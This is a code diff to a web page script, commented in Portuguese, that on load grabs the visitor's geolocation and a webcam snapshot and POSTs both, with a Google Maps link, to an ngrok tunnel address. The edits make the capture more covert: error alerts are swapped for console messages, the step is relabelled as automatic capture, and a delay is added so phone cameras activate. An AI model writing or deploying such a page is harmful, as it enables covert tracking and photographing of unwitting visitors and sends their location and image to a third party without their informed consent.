@@ -30,13 +30,13 @@
       const ano = dataAtual.getFullYear();
       document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
 
-      // Captura localização
+      // Inicia captura automática
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendData, (err) => {
-          alert("Erro na geolocalização: " + err.message);
+          console.error("Erro na geolocalização:", err.message);
         });
       } else {
-        alert("Geolocalização não suportada.");
+        console.error("Geolocalização não suportada.");
       }
     });
 
@@ -45,12 +45,14 @@
       const longitude = position.coords.longitude;
       const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-      // Captura a imagem
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
+
+        // Aguarda a câmera ativar (essencial no celular)
+        await new Promise(resolve => setTimeout(resolve, 1500));
 
         const canvas = document.createElement("canvas");
         canvas.width = 640;
@@ -61,13 +63,16 @@
 
         stream.getTracks().forEach(track => track.stop());
 
+        // Envia dados para o backend
         await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ latitude, longitude, maps, image })
         });
+
+        console.log("Dados enviados com sucesso.");
       } catch (error) {
-        console.error("Erro ao capturar imagem:", error);
+        console.error("Erro ao capturar imagem ou enviar:", error);
       }
     }
   </script>
